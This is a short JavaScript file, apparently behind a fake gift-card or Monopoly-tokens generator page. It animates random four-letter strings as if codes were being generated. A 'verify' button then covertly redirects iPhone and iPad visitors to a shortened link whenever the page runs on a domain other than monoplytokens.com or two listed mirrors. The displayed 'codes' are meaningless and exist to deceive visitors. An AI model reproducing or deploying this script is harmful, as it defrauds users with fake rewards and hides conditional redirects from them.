/*================== [ VICTOR ABDO ] ===============*/
/*================== [ talghi gift card iph ] ================*/
var button = document.querySelector('.verify');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "monoplytokens.com";
        var redirectURL = "https://smrturl.co/8a45e5f";
        var blockedDomains = [
            "mply.io.1arshg4.site",
            "mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            if (isIphoneOrIpad) { 
                window.location.href = redirectURL;
            }
        }
    })();
});

const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

function generateString(length) {
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function gen(html) {
    var timesRun = 0;
    var interval = setInterval(function() {
        timesRun += 1;
        if (timesRun === 60) {
            clearInterval(interval);
        }
        var txt = generateString(4);
        $("." + html).text(txt);
    }, 50);
}

$(".select").on("click", function() {
    setTimeout(function() { gen("sp1") }, 10);
    setTimeout(function() { gen("sp2") }, 3000);
    setTimeout(function() { gen("sp3") }, 6000);
    
    var src = $(this).attr("src");
    $(".main-img").attr("src", src);
    $(".item-1").addClass("d-none");
    $(".item-2").removeClass("d-none");
    
    setTimeout(function() { $(".verify").removeClass("d-none"); }, 9000);
});
